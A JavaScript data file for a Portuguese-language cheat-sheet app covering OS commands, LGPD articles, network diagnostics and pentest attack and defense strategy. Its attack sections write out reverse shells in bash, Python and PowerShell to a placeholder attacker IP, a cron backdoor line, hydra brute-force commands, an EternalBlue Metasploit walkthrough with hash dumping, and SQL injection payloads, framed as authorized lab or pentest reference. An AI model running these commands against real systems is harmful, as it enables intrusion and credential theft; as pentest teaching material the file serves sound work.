// Atalhos: prompts de comando, LGPD, scripts, rede, estratégia de ataques e defesa (elite)

export const categoriasAtalhos = [
  { id: 'windows', nome: 'Windows', cor: '#0078d4' },
  { id: 'mac', nome: 'macOS', cor: '#555' },
  { id: 'linux', nome: 'Linux', cor: '#fcc624' },
  { id: 'kali', nome: 'Kali Linux', cor: '#557c94' },
  { id: 'lgpd', nome: 'LGPD', cor: '#0d9488' },
  { id: 'scripts', nome: 'Scripts limpeza', cor: '#10b981' },
  { id: 'rede', nome: 'Rede', cor: '#3b82f6' },
  { id: 'ataques', nome: 'Estratégia ataques', cor: '#ef4444' },
  { id: 'defesa', nome: 'Estratégia defesa', cor: '#10b981' },
];

export const atalhos = [
  // ========== WINDOWS ==========
  {
    id: 'win-prompt',
    categoriaId: 'windows',
    titulo: 'Prompt de comando – Windows (CMD/PowerShell)',
    blocos: [
      { label: 'Abrir CMD como admin', codigo: 'Win + X → "Terminal (Admin)" ou CMD' },
      { label: 'Abrir PowerShell', codigo: 'powershell\n# ou: Win + X → Windows PowerShell' },
      { label: 'Navegação e arquivos', codigo: 'cd \\                    # raiz\ncd pasta\\subpasta       # entrar\ncd ..                   # voltar\ndir                     # listar\ndel arquivo.txt         # apagar\ncls                     # limpar tela' },
      { label: 'Sistema e processos', codigo: 'systeminfo              # info do sistema\nwhoami                  # usuário atual\nwhoami /priv            # privilégios\ntasklist                # processos\ntaskkill /PID 1234 /F   # matar processo' },
      { label: 'Rede (CMD)', codigo: 'ipconfig                # config de rede\nipconfig /all           # detalhes\nipconfig /release       # liberar IP\nipconfig /renew         # renovar DHCP\nping 8.8.8.8            # testar conectividade\nnetstat -an             # conexões e portas\ntracert google.com      # rota até destino' },
    ],
  },
  {
    id: 'win-powershell',
    categoriaId: 'windows',
    titulo: 'PowerShell – Segurança e rede',
    blocos: [
      { label: 'Rede', codigo: 'Get-NetIPConfiguration\nGet-NetTCPConnection | Where-Object {$_.State -eq "Listen"}\nTest-NetConnection -ComputerName 8.8.8.8 -Port 443' },
      { label: 'Firewall', codigo: 'Get-NetFirewallRule | Where-Object {$_.Enabled -eq "True"}\nGet-NetFirewallProfile' },
      { label: 'Eventos (logs)', codigo: 'Get-EventLog -LogName Security -Newest 20\nGet-WinEvent -FilterHashtable @{LogName="Security"; Id=4624} -MaxEvents 10' },
      { label: 'Usuários locais', codigo: 'Get-LocalUser\nGet-LocalGroup' },
    ],
  },

  // ========== MAC ==========
  {
    id: 'mac-terminal',
    categoriaId: 'mac',
    titulo: 'Terminal – macOS',
    blocos: [
      { label: 'Navegação', codigo: 'cd ~/Documents       # ir para pasta\nls -la               # listar (detalhes)\npwd                  # diretório atual\nopen .               # abrir Finder aqui' },
      { label: 'Sistema e rede', codigo: 'whoami\nid\nifconfig | grep "inet "\nnetstat -an | grep LISTEN\nping -c 4 8.8.8.8' },
      { label: 'Processos', codigo: 'ps aux | grep nome\nkill -9 PID\ntop                  # processos em tempo real' },
      { label: 'Permissões', codigo: 'ls -la              # ver permissões\nchmod 755 arquivo.sh\nchown user:group arquivo' },
    ],
  },

  // ========== LINUX ==========
  {
    id: 'linux-bash',
    categoriaId: 'linux',
    titulo: 'Bash / Linux – Comandos essenciais',
    blocos: [
      { label: 'Sistema e usuário', codigo: 'whoami\nid\nuname -a\ncat /etc/os-release' },
      { label: 'Rede', codigo: 'ip a\n# ou: ifconfig\nip route\nss -tulpn\n# ou: netstat -tulpn\nping -c 4 8.8.8.8' },
      { label: 'Processos e serviços', codigo: 'ps aux\nps aux | grep nome\ntop   # ou htop\nsystemctl list-units --type=service\nsystemctl status nome-servico' },
      { label: 'Arquivos e permissões', codigo: 'ls -la\nchmod 755 script.sh\nchown user:group arquivo\nfind / -name "*.conf" 2>/dev/null' },
      { label: 'Logs', codigo: 'tail -f /var/log/syslog\njournalctl -xe\njournalctl -u nginx -f' },
    ],
  },

  // ========== KALI LINUX ==========
  {
    id: 'kali-recon',
    categoriaId: 'kali',
    titulo: 'Kali Linux – Reconhecimento e varredura',
    blocos: [
      { label: 'Nmap – portas e serviços', codigo: 'nmap -sV 192.168.1.1\nnmap -sC -sV -p- 192.168.1.1\nnmap -sn 192.168.1.0/24\nnmap --script vuln 192.168.1.1' },
      { label: 'Recon (OSINT)', codigo: 'theHarvester -d dominio.com -b all\nwhois dominio.com\ndig dominio.com\nnslookup dominio.com' },
      { label: 'Serviços e versões', codigo: 'nikto -h http://192.168.1.1\ndirb http://192.168.1.1 /usr/share/wordlists/dirb/common.txt' },
    ],
  },
  {
    id: 'kali-exploit',
    categoriaId: 'kali',
    titulo: 'Kali – Exploração e pós-exploração',
    blocos: [
      { label: 'Metasploit (resumo)', codigo: 'msfconsole\nsearch exploit nome\nuse exploit/...\nset RHOSTS 192.168.1.1\nset PAYLOAD ...\nrun' },
      { label: 'Hash e senha', codigo: 'hashcat -m 0 hash.txt wordlist.txt\njohn --wordlist=wordlist.txt hash.txt' },
      { label: 'Escalação e persistência', codigo: '# Após acesso: enumeração\nwhoami /priv\nsysteminfo\n# Linux: uname -a, cat /etc/passwd' },
    ],
  },

  // ========== LGPD ==========
  {
    id: 'lgpd-artigos',
    categoriaId: 'lgpd',
    titulo: 'LGPD – Atalhos por artigos',
    blocos: [
      { label: 'Art. 1º–3º – Objeto e aplicação', codigo: 'Lei 13.709/2018. Objeto: proteção dos dados pessoais. Aplica-se a tratamento em meios digitais ou não, por pessoa natural ou jurídica, pública ou privada, no Brasil ou oferta de bens/serviços a pessoas no Brasil.' },
      { label: 'Art. 5º – Definições', codigo: 'Dado pessoal: informação relacionada a pessoa natural identificada ou identificável.\nTitular: pessoa natural a quem se referem os dados.\nControlador: quem decide sobre o tratamento.\nOperador: quem realiza o tratamento em nome do controlador.\nANPD: Autoridade Nacional de Proteção de Dados.' },
      { label: 'Art. 6º – Princípios', codigo: 'Finalidade; adequação; necessidade; livre acesso; qualidade; transparência; segurança; prevenção; não discriminação; responsabilização e prestação de contas.' },
      { label: 'Art. 7º – Bases legais (tratamento sem consentimento)', codigo: 'I obrigação legal; II políticas públicas; III estudos (órgão de pesquisa); IV execução de contrato; V exercício de direitos em processo; VI proteção da vida; VII tutela da saúde; VIII interesse legítimo do controlador; IX proteção do crédito; X garantia de prevenção à fraude; XI consentimento do titular.' },
      { label: 'Art. 18 – Direitos do titular', codigo: 'Confirmação de tratamento; acesso; correção; anonimização/bloqueio/eliminação; portabilidade; eliminação (dados tratados com consentimento); informação sobre compartilhamento; revogação do consentimento.' },
      { label: 'Art. 41–45 – Sanções', codigo: 'Advertência; multa (até 2% do faturamento, limitada a R$ 50 milhões por infração); multa diária; publicização da infração; bloqueio ou eliminação dos dados. Processo administrativo na ANPD.' },
    ],
  },

  // ========== SCRIPTS LIMPEZA ==========
  {
    id: 'script-win-limpeza',
    categoriaId: 'scripts',
    titulo: 'Script de limpeza – Windows (batch)',
    blocos: [
      { label: 'Limpeza básica (temp, cache)', codigo: '@echo off\nREM Executar como Administrador se quiser limpar mais\ncd %TEMP%\ndel /q * 2>nul\ncd %SystemRoot%\\Temp\ndel /q * 2>nul\nipconfig /flushdns\necho Limpeza concluida.\npause' },
      { label: 'Limpar DNS e cache de rede', codigo: 'ipconfig /flushdns\nipconfig /registerdns\nnetsh winsock reset\nnetsh int ip reset\nREM Reiniciar apos os comandos acima se necessario.' },
    ],
  },
  {
    id: 'script-linux-limpeza',
    categoriaId: 'scripts',
    titulo: 'Script de limpeza – Linux',
    blocos: [
      { label: 'Limpeza de cache e temp', codigo: '#!/bin/bash\nsudo apt clean\nsudo apt autoclean\nsudo rm -rf /tmp/*\nsudo journalctl --vacuum-time=3d\n# Opcional: remover pacotes órfãos\n# sudo apt autoremove -y' },
      { label: 'Limpar memória cache (sem reiniciar)', codigo: 'sync; echo 3 | sudo tee /proc/sys/vm/drop_caches' },
    ],
  },

  // ========== REDE ==========
  {
    id: 'rede-diagnostico',
    categoriaId: 'rede',
    titulo: 'Comandos de rede – Diagnóstico e limpeza',
    blocos: [
      { label: 'Teste de conectividade', codigo: 'ping 8.8.8.8\nping google.com\n# Linux/Mac: ping -c 4 8.8.8.8' },
      { label: 'Rota e DNS', codigo: 'tracert google.com       # Windows\ntraceroute google.com   # Linux/Mac\nnslookup google.com\ndig google.com' },
      { label: 'Portas e conexões', codigo: 'netstat -an             # Windows: todas as conexões\nnetstat -an | findstr LISTENING\nss -tulpn                # Linux: portas em escuta' },
      { label: 'Renovar IP (DHCP)', codigo: 'ipconfig /release\nipconfig /renew\n# Linux: sudo dhclient -r; sudo dhclient' },
    ],
  },

  // ========== ESTRATÉGIA ATAQUES (ELITE) ==========
  {
    id: 'estrategia-fases',
    categoriaId: 'ataques',
    titulo: 'Estratégia de ataque – Fases (modo elite)',
    blocos: [
      { label: '1. Reconhecimento (Recon)', codigo: 'OSINT: domínios, subdomínios, IPs, tecnologias, pessoas.\nFerramentas: theHarvester, Shodan, Google dorks, whois, DNS.\nObjetivo: mapear superfície de ataque sem tocar no alvo.' },
      { label: '2. Varredura (Scanning)', codigo: 'Portas abertas: nmap -sV -sC -p-.\nServiços e versões. Scripts: nmap --script vuln, default.\nObjetivo: lista de vetores (porta + serviço + versão).' },
      { label: '3. Obtenção de acesso (Gaining Access)', codigo: 'Exploração de vulnerabilidade (exploit, credencial, config).\nPriorizar: críticas e de fácil exploração.\nObjetivo: acesso inicial (shell, usuário).' },
      { label: '4. Manutenção (Maintaining Access)', codigo: 'Persistência: backdoor, tarefa agendada, serviço.\nEvitar detecção: ofuscação, limpeza de logs (em pentest autorizado, documentar).' },
      { label: '5. Pós-exploração e movimento lateral', codigo: 'Enumeração: usuários, grupos, privilégios, rede interna.\nEscalação: de usuário a admin/sistema.\nMovimento lateral: outros hosts na rede.' },
      { label: '6. Cobertura de rastros (Covering Tracks)', codigo: 'Em pentest: documentar; não destruir evidências sem combinar.\nEm cenário real (criminoso): limpar logs – ilegal. Profissional não cobre rastros de forma maliciosa; entrega relatório.' },
    ],
  },
  {
    id: 'estrategia-checklist',
    categoriaId: 'ataques',
    titulo: 'Checklist elite – Antes e durante o ataque',
    blocos: [
      { label: 'Antes do engajamento', codigo: '[] Escopo por escrito (IPs, domínios, tipos de teste).\n[] Autorização formal (contrato/termo).\n[] Regras de engajamento (horário, tipos de exploit, contato em caso de impacto).\n[] Ambiente de teste/backup se aplicável.\n[] Ferramentas e wordlists atualizadas.' },
      { label: 'Durante o teste', codigo: '[] Documentar cada achado (comando, evidência, screenshot).\n[] Não exceder escopo.\n[] Em caso de impacto (queda de serviço): parar e avisar.\n[] Priorizar: crítico > alto > médio > baixo.\n[] Coletar IOCs (IPs, hashes, URLs) para o relatório.' },
      { label: 'Após o teste', codigo: '[] Remover backdoors e artefatos deixados (conforme combinado).\n[] Relatório: executivo + técnico; vulnerabilidades com severidade e recomendações.\n[] Apresentação e entrega formal.' },
    ],
  },
  {
    id: 'estrategia-comandos-rapidos',
    categoriaId: 'ataques',
    titulo: 'Comandos rápidos – Pentest (referência)',
    blocos: [
      { label: 'Recon rápido', codigo: 'nmap -sV -sC -p 21,22,80,443,3389,8080 <IP>\nnmap -sn <rede>/24' },
      { label: 'Web', codigo: 'nikto -h http://<IP>\ngobuster dir -u http://<IP> -w /usr/share/wordlists/dirb/common.txt' },
      { label: 'Hash (crack)', codigo: 'hashcat -m 1000 hash.txt wordlist.txt\njohn hash.txt --wordlist=wordlist.txt' },
      { label: 'Shell reverso (exemplo)', codigo: '# Atacante: nc -lvnp 4444\n# Alvo (ex.): bash -i >& /dev/tcp/ATACANTE_IP/4444 0>&1' },
    ],
  },
  {
    id: 'estrategia-ataque-tipos',
    categoriaId: 'ataques',
    titulo: 'Estratégia de ataque – Tipos e vetores',
    blocos: [
      { label: 'Ataque por credenciais', codigo: 'Phishing → roubo de senha/MFA.\nForça bruta / credential stuffing em login, RDP, SSH.\nPass-the-Hash, Pass-the-Ticket (Windows).\nObjetivo: conta válida para acesso inicial ou movimento lateral.' },
      { label: 'Ataque por vulnerabilidade', codigo: 'Exploração de CVE em serviço exposto (web, RDP, SMB).\nSQL Injection, XSS, RCE em aplicações.\nObjetivo: execução de código ou acesso a dados sem credencial.' },
      { label: 'Ataque por engenharia social', codigo: 'Phishing (e-mail, SMS, chamada).\nPretexting, baiting, quid pro quo.\nObjetivo: que o usuário execute ação (clique, abra anexo, revele senha).' },
      { label: 'Malware e ransomware', codigo: 'Dropper → download/execução de payload.\nPersistência: registro, agendador, serviço.\nRansomware: criptografia + resgate; exfiltração antes (double extortion).\nObjetivo: controle do host, extorsão ou roubo de dados.' },
      { label: 'Movimento lateral e privilégio', codigo: 'Enumeração: usuários, grupos, shares, GPO.\nEscalação: exploit local, credencial de admin em cache.\nLateral: RDP, SSH, WMI, PsExec para outros hosts.\nObjetivo: dominar a rede e chegar a dados críticos.' },
      { label: 'Exfiltração e impacto', codigo: 'Exfiltração: upload para C2, cloud, e-mail.\nDestruição: wiper, apagar backups.\nDDoS ou desligar sistemas para impacto operacional.' },
    ],
  },

  // ========== ONDE FAZER + PASSO A PASSO ==========
  {
    id: 'ataque-onde-fazer',
    categoriaId: 'ataques',
    titulo: 'Onde fazer esses ataques – Ambiente autorizado',
    blocos: [
      { label: 'Regra de ouro', codigo: 'Só ataque em ambiente que você tem AUTORIZAÇÃO por escrito (contrato, termo). Atacar rede/sistema sem autorização é crime (Art. 154-A do Código Penal).' },
      { label: 'Opção 1 – Laboratório em casa (VM)', codigo: 'Onde: sua máquina.\nComo: VirtualBox/VMware. Uma VM com Kali Linux (atacante) e uma ou mais VMs alvo (ex.: Metasploitable, DVWA, Windows 7/10 vulnerável).\nDownload: Metasploitable2, DVWA, VulnHub (máquinas prontas para pentest).\nRede: modo "Rede interna" ou "Host-only" para as VMs se falarem.' },
      { label: 'Opção 2 – Plataformas de treino', codigo: 'HackTheBox (HTB): lab online, máquinas vulneráveis, VPN para acessar. Pago (premium) ou free.\nTryHackMe: trilhas guiadas + labs. Bom para passo a passo.\nVulnHub: imagens de VMs para baixar e rodar local.\nPentesterLab, Offensive Security (PWK/OSCP lab): mais avançado.' },
      { label: 'Opção 3 – Pentest real', codigo: 'Onde: rede/sistemas do cliente.\nComo: contrato com escopo (IPs, domínios, tipos de teste), regras de engajamento, janela de teste. Relatório ao final.\nNunca teste em produção sem autorização formal.' },
    ],
  },
  {
    id: 'ataque-passo-a-passo',
    categoriaId: 'ataques',
    titulo: 'Passo a passo do ataque – Onde executar cada etapa',
    blocos: [
      { label: 'Passo 0 – Preparar ambiente', codigo: 'Onde: sua máquina / VM Kali.\nO que fazer: Abrir terminal no Kali. Anotar seu IP (atacante): ip a. Anotar IP do alvo (ex.: 192.168.56.101). Ter wordlist: /usr/share/wordlists/rockyou.txt (ou similar).\nComando: ip a | grep "inet "' },
      { label: 'Passo 1 – Reconhecimento (Recon)', codigo: 'Onde: Kali (terminal).\nAlvo: IP ou domínio do alvo (só em lab/autorizado).\nComandos:\n  whois dominio.com\n  dig dominio.com\n  theHarvester -d dominio.com -b bing\nObjetivo: listar IPs, subdomínios, e-mails. Sem tocar no servidor ainda.' },
      { label: 'Passo 2 – Varredura de rede (Scan)', codigo: 'Onde: Kali.\nAlvo: IP do alvo (ex.: 192.168.56.101).\nComandos:\n  nmap -sn 192.168.56.0/24\n  nmap -sV -sC -p- 192.168.56.101\n  nmap --script vuln 192.168.56.101\nObjetivo: portas abertas, serviços, versões, possíveis vulnerabilidades.' },
      { label: 'Passo 3 – Varredura de aplicação (se tiver Web)', codigo: 'Onde: Kali.\nAlvo: http://192.168.56.101 ou http://192.168.56.101:8080.\nComandos:\n  nikto -h http://192.168.56.101\n  gobuster dir -u http://192.168.56.101 -w /usr/share/wordlists/dirb/common.txt -t 50\n  ffuf -u http://192.168.56.101/FUZZ -w /usr/share/wordlists/dirb/common.txt\nObjetivo: diretórios ocultos, arquivos, erros que revelem tecnologia.' },
      { label: 'Passo 4 – Obter acesso (Exploit)', codigo: 'Onde: Kali (e às vezes no navegador para web).\nAlvo: serviço vulnerável (ex.: SSH na 22, HTTP na 80, SMB na 445).\nExemplos:\n  • Força bruta SSH: hydra -l root -P rockyou.txt ssh://192.168.56.101\n  • Metasploit: msfconsole → search exploit → use → set RHOSTS → run\n  • Web (SQLi/XSS): usar Burp Suite ou manual no navegador; payload em campo de login ou URL.\nObjetivo: shell (comando no alvo) ou acesso a painel/dados.' },
      { label: 'Passo 5 – Pós-exploração (no alvo)', codigo: 'Onde: DENTRO do alvo (shell que você obteve).\nSe for Linux: whoami, id, cat /etc/passwd, sudo -l, uname -a.\nSe for Windows: whoami, whoami /priv, systeminfo, net user, net localgroup administrators.\nObjetivo: entender usuário atual, privilégios, e como escalar para admin.' },
      { label: 'Passo 6 – Escalação e persistência (se combinado)', codigo: 'Onde: no alvo (shell) e em Kali (para receber shell reverso).\nExemplo persistência Linux: echo "*/1 * * * * /tmp/backdoor.sh" | crontab -\nExemplo Windows: criar tarefa agendada ou serviço.\nEm pentest autorizado: documentar; ao final remover backdoors.' },
    ],
  },
  {
    id: 'ataque-prompts-rede',
    categoriaId: 'ataques',
    titulo: 'Prompts de ataque – Rede e varredura (Kali)',
    blocos: [
      { label: 'Descoberta de hosts na rede', codigo: '# Onde: Kali. Substitua 192.168.56.0/24 pela rede alvo.\nnmap -sn 192.168.56.0/24\n# Lista hosts que respondem. Anote os IPs ativos.' },
      { label: 'Varredura completa de um host', codigo: '# Onde: Kali. Substitua TARGET_IP pelo IP do alvo.\nnmap -sV -sC -p- -T4 TARGET_IP -oN scan.txt\n# -sV: versões; -sC: scripts default; -p-: todas as portas; -oN: salvar resultado.' },
      { label: 'Scripts de vulnerabilidade (nmap)', codigo: 'nmap --script vuln TARGET_IP\nnmap --script exploit TARGET_IP\n# Roda scripts que checam vulnerabilidades conhecidas.' },
      { label: 'Varredura UDP (portas comuns)', codigo: 'nmap -sU --top-ports 100 TARGET_IP\n# UDP é mais lento; use em janela de teste se autorizado.' },
    ],
  },
  {
    id: 'ataque-prompts-web',
    categoriaId: 'ataques',
    titulo: 'Prompts de ataque – Web (Kali + navegador)',
    blocos: [
      { label: 'Descoberta de diretórios', codigo: '# Onde: Kali.\ngobuster dir -u http://TARGET_IP -w /usr/share/wordlists/dirb/common.txt -t 40 -x php,txt,html\n# -x: extensões a tentar. Ajuste URL e wordlist.' },
      { label: 'SQL Injection (teste manual)', codigo: 'Onde: navegador ou Burp. Em campo de login ou URL com parâmetro.\nTeste em: http://TARGET_IP/page?id=1\nTentar: id=1\'  ;  id=1 OR 1=1  ;  id=1 UNION SELECT 1,2,3--\nSe der erro de SQL ou mudar resultado = possível SQLi. Use sqlmap para explorar:\n  sqlmap -u "http://TARGET_IP/page?id=1" --dbs' },
      { label: 'Nikto (scan rápido de vulnerabilidades web)', codigo: 'nikto -h http://TARGET_IP\nnikto -h http://TARGET_IP -p 8080' },
      { label: 'Burp Suite (interceptar e reenviar)', codigo: 'Onde: Kali. Abrir Burp Suite. Navegador com proxy 127.0.0.1:8080.\nInterceptar requisição → modificar parâmetros (ex.: cookie, id) → Forward.\nÚtil para SQLi, XSS, bypass de login.' },
    ],
  },
  {
    id: 'ataque-prompts-credenciais',
    categoriaId: 'ataques',
    titulo: 'Prompts de ataque – Quebra de credenciais (Kali)',
    blocos: [
      { label: 'Hydra – SSH', codigo: '# Onde: Kali. Alvo: serviço SSH no TARGET_IP.\nhydra -l root -P /usr/share/wordlists/rockyou.txt ssh://TARGET_IP\n# Um usuário: -l user. Lista de usuários: -L users.txt -P pass.txt' },
      { label: 'Hydra – RDP (Windows)', codigo: 'hydra -l administrator -P /usr/share/wordlists/rockyou.txt rdp://TARGET_IP' },
      { label: 'Hydra – HTTP (login de formulário)', codigo: 'hydra -l admin -P rockyou.txt TARGET_IP http-post-form "/login:user=^USER^&pass=^PASS^:F=incorrect"' },
      { label: 'Crack de hash – John', codigo: '# Onde: Kali. Arquivo hash.txt com um hash por linha.\njohn hash.txt\njohn hash.txt --wordlist=/usr/share/wordlists/rockyou.txt\n# Formato: john identifica muitos; para NTLM use --format=nt' },
      { label: 'Crack de hash – Hashcat (NTLM)', codigo: 'hashcat -m 1000 hash.txt /usr/share/wordlists/rockyou.txt\n# -m 1000 = NTLM. Hash no formato LM:NTLM ou só NTLM.' },
    ],
  },
  {
    id: 'ataque-prompts-metasploit',
    categoriaId: 'ataques',
    titulo: 'Prompts de ataque – Metasploit passo a passo (Kali)',
    blocos: [
      { label: 'Iniciar e buscar exploit', codigo: '# Onde: Kali.\nmsfconsole\nsearch eternalblue\n# ou: search tipo_serviço (ex.: smb, apache)\nuse exploit/windows/smb/ms17_010_eternalblue' },
      { label: 'Configurar e explorar', codigo: 'set RHOSTS 192.168.56.101\nset PAYLOAD windows/x64/meterpreter/reverse_tcp\nset LHOST 192.168.56.102\n# LHOST = IP da sua Kali (quem recebe a conexão reversa).\nrun\n# Se der certo, você cai em uma sessão meterpreter no alvo.' },
      { label: 'Meterpreter – comandos úteis (no alvo)', codigo: 'shell          # abrir shell do Windows\nsysinfo        # info do sistema\ngetuid         # usuário atual\nhashdump       # hashes de senha (para crack ou Pass-the-Hash)\nrun post/windows/gather/enum_users   # enum usuários' },
      { label: 'Exploit genérico (ex.: handler para shell reverso)', codigo: 'use exploit/multi/handler\nset PAYLOAD windows/meterpreter/reverse_tcp\nset LHOST SEU_IP\nset LPORT 4444\nrun\n# Depois, no alvo você executa um payload que conecta de volta nessa porta.' },
    ],
  },
  {
    id: 'ataque-prompts-shell',
    categoriaId: 'ataques',
    titulo: 'Prompts de ataque – Shell reverso (onde rodar)',
    blocos: [
      { label: 'Atacante (Kali) – escutar conexão', codigo: '# Onde: Kali. Abrir primeiro.\nnc -lvnp 4444\n# ou: msfconsole → use multi/handler → set PAYLOAD ... → set LPORT 4444 → run' },
      { label: 'Alvo Linux – bash reverso', codigo: '# Onde: DENTRO do alvo (após RCE ou acesso). Troque ATACANTE_IP e 4444.\nbash -i >& /dev/tcp/ATACANTE_IP/4444 0>&1' },
      { label: 'Alvo Linux – Python', codigo: 'python3 -c \'import socket,subprocess,os;s=socket.socket();s.connect(("ATACANTE_IP",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])\'' },
      { label: 'Alvo Windows – PowerShell', codigo: '# No alvo (PowerShell). Troque ATACANTE_IP e 4444.\npowershell -nop -c "$c=new-object net.sockets.tcpclient(\'ATACANTE_IP\',4444);$s=$c.getstream();[byte[]]$b=0..65535|%{0};while(($i=$s.read($b,0,$b.length)) -ne 0){$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);$r=(iex $d 2>&1);$r2=$r+\'PS \'+pwd+\'> \';$s2=[text.encoding]::ASCII.GetBytes($r2);$s.write($s2,0,$s2.length)}"' },
    ],
  },
  {
    id: 'ataque-prompts-pos',
    categoriaId: 'ataques',
    titulo: 'Prompts de ataque – Pós-exploração (dentro do alvo)',
    blocos: [
      { label: 'Linux – enumeração', codigo: '# Onde: shell no alvo Linux.\nwhoami && id\nuname -a\ncat /etc/passwd\ncat /etc/shadow   # se tiver permissão\nsudo -l         # o que pode rodar como root?\nfind / -perm -4000 2>/dev/null   # SUID\nnetstat -tulpn  # portas e processos' },
      { label: 'Windows – enumeração', codigo: '# Onde: shell (cmd ou PowerShell) no alvo Windows.\nwhoami\nwhoami /priv\nsysteminfo\nnet user\nnet localgroup administrators\nipconfig\nnetstat -an\n# Buscar senhas em texto: dir /s /b *.txt (cuidado em produção)' },
      { label: 'Linux – escalar para root (ex.: exploit SUID)', codigo: '# Se encontrar binário SUID (ex.: find / -perm -4000).\n# Pesquisar no searchsploit: searchsploit nome_binario\n# Ou: LinPEAS, LinEnum (scripts de enumeração automática).' },
      { label: 'Windows – dump de hashes (após admin)', codigo: '# No Kali (Meterpreter): hashdump\n# Ou no alvo com mimikatz (autorizado). Hashes NTLM para Pass-the-Hash ou crack offline.' },
    ],
  },

  // ========== ESTRATÉGIA DEFESA (ELITE) ==========
  {
    id: 'defesa-prevencao',
    categoriaId: 'defesa',
    titulo: 'Estratégia de defesa – Prevenção',
    blocos: [
      { label: 'Hardening (endurecimento)', codigo: 'Desativar serviços e portas desnecessários.\nRemover software não usado.\nConfigurar firewall do SO (só o essencial aberto).\nPolítica de senha forte e MFA em todos os acessos críticos.' },
      { label: 'Atualização e patch', codigo: 'Manter SO e aplicações atualizados (patch de segurança).\nPriorizar vulnerabilidades críticas e exploradas (CISA KEV, etc.).\nTestar patch em homologação antes de produção.\nCiclo de atualização definido (ex.: mensal para críticos).' },
      { label: 'Privilégio mínimo', codigo: 'Usuário comum no dia a dia; admin só quando necessário.\nContas de serviço com menor privilégio possível.\nSem compartilhamento de contas; revogação ao sair da função.' },
      { label: 'Segmentação de rede', codigo: 'VLANs por função (admin, TI, usuários, visitantes, IoT).\nFirewall entre segmentos; tráfego só onde for necessário.\nReduz blast radius: comprometimento em um segmento não alcança todos.' },
      { label: 'Conscientização', codigo: 'Treinamento anti-phishing e uso seguro (links, anexos, senhas).\nSimulação de phishing para medir e melhorar.\nPolítica de uso aceitável e de classificação de dados.' },
    ],
  },
  {
    id: 'defesa-detecao',
    categoriaId: 'defesa',
    titulo: 'Estratégia de defesa – Detecção',
    blocos: [
      { label: 'Logs centralizados', codigo: 'Coletar logs de: firewall, proxy, SO, aplicações, AD, EDR.\nRetenção definida (ex.: 90 dias mínimo para investigação).\nProteção e integridade dos logs (acesso restrito, WORM se aplicável).' },
      { label: 'SIEM e correlação', codigo: 'SIEM: normalização, correlação de eventos, regras de detecção.\nAlertas para: múltiplas falhas de login, acesso anômalo, horário incomum, mudança de permissão.\nTuning para reduzir falso positivo e manter sensibilidade.' },
      { label: 'EDR e endpoint', codigo: 'EDR: visibilidade de processos, rede e arquivos no endpoint.\nDetecção de comportamento malicioso (injeção, persistência, C2).\nResposta remota: isolar host, coletar artefato, matar processo.' },
      { label: 'Monitoramento de rede', codigo: 'Tráfego suspeito: conexões para IPs maliciosos, DNS anômalo, exfiltração.\nIDS/IPS: assinaturas e anomalia.\nNetFlow/PCAP para análise forense pós-incidente.' },
      { label: 'Indicadores de comprometimento (IOC)', codigo: 'Hashes de malware, IPs/domínios de C2, padrões de registro ou arquivo.\nIntegrar IOCs em EDR, firewall, SIEM.\nAtualizar com threat intelligence (feeds, relatórios).' },
    ],
  },
  {
    id: 'defesa-resposta',
    categoriaId: 'defesa',
    titulo: 'Estratégia de defesa – Resposta a incidentes',
    blocos: [
      { label: 'Identificação', codigo: 'Reconhecer que um incidente está ocorrendo (alerta, usuário, anomalia).\nTriagem: severidade, escopo inicial, tipo (malware, phishing, invasão).\nAcionar equipe de resposta e iniciar documentação (linha do tempo).' },
      { label: 'Contenção', codigo: 'Impedir que o incidente se amplie.\nCurto prazo: isolar host (desconectar rede), desabilitar conta comprometida, bloquear IP/URL em firewall/proxy.\nLongo prazo: segmentar rede, trocar credenciais em escopo afetado.' },
      { label: 'Erradicação', codigo: 'Remover a causa: malware removido, vulnerabilidade corrigida (patch ou workaround).\nTrocar todas as senhas que possam ter sido expostas.\nRemover backdoors e contas criadas pelo atacante.' },
      { label: 'Recuperação', codigo: 'Restaurar sistemas a partir de backup limpo (validar integridade).\nRecolocar hosts na rede de forma controlada.\nMonitorar para garantir que a ameaça não retorne.' },
      { label: 'Lições aprendidas', codigo: 'Reunião pós-incidente: o que aconteceu, o que funcionou, o que falhou.\nAtualizar playbooks, regras de detecção e controles.\nComunicar à liderança e, se aplicável, à ANPD/afetados (LGPD).' },
    ],
  },
  {
    id: 'defesa-arquitetura',
    categoriaId: 'defesa',
    titulo: 'Estratégia de defesa – Arquitetura e modelo',
    blocos: [
      { label: 'Defesa em profundidade', codigo: 'Múltiplas camadas: perímetro (firewall), rede (segmentação, IDS/IPS), endpoint (EDR, antimalware), dados (criptografia, DLP), aplicação (WAF, código seguro).\nNenhuma camada sozinha é suficiente; uma falha não significa perda total.' },
      { label: 'Zero Trust (conceito)', codigo: 'Nunca confiar, sempre verificar.\nVerificar identidade e contexto (dispositivo, rede, comportamento) em cada acesso.\nAcesso mínimo por sessão; microsegmentação.\nAssume que a rede interna pode estar comprometida.' },
      { label: 'Ciclo de segurança (NIST)', codigo: 'Identify → Protect → Detect → Respond → Recover.\nIdentify: ativos, riscos, governança.\nProtect: controles preventivos.\nDetect: monitoramento e alertas.\nRespond: plano de resposta, comunicação.\nRecover: restauração e melhoria contínua.' },
    ],
  },
  {
    id: 'defesa-checklist',
    categoriaId: 'defesa',
    titulo: 'Checklist de defesa – Controles essenciais',
    blocos: [
      { label: 'Prevenção', codigo: '[] MFA em todos os acessos críticos (e-mail, VPN, admin).\n[] Patch de segurança em prazo definido (ex.: crítico em 7 dias).\n[] Política de senha (complexidade, não reutilização).\n[] Segmentação de rede (pelo menos admin separado).\n[] Backup automatizado e teste de restauração.' },
      { label: 'Detecção', codigo: '[] Logs de autenticação e acesso centralizados.\n[] Antimalware/EDR em todos os endpoints e servidores.\n[] Monitoramento de rede (firewall/proxy com log; IDS se possível).\n[] Alertas para falha de login em massa e acesso em horário anômalo.' },
      { label: 'Resposta', codigo: '[] Plano de resposta a incidentes documentado.\n[] Contatos (equipe interna, jurídico, comunicação).\n[] Procedimentos de contenção (isolar host, bloquear conta).\n[] Possibilidade de restauração a partir de backup.' },
    ],
  },
];

export function getAtalhosPorCategoria(categoriaId) {
  return atalhos.filter((a) => a.categoriaId === categoriaId);
}

export function getCategoriaAtalho(id) {
  return categoriasAtalhos.find((c) => c.id === id);
}
